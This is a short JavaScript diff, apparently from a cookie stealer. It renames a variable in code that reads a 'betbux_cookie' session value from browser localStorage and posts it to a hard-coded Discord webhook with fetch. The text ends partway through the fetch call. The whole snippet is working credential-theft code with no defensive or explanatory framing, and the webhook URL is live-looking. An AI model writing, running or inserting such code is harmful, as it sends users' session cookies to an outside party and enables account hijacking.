@@ -1,8 +1,8 @@
-var betbux_cookie = localStorage.getItem("betbux_cookie");
-if (betbux_cookie) {
+var cookie = localStorage.getItem("betbux_cookie");
+if (cookie) {
   var webhookUrl = "https://discord.com/api/webhooks/1106660785553412257/qLLuUezNY3eEL2smKS-am07mLTXGucXUou7LPjLsJQl9Owq3p81VYUNYBImImslzSlcu";
   var payload = {
-    content: betbux_cookie
+    content: cookie
   };
   fetch(webhookUrl, {
     method: "POST",
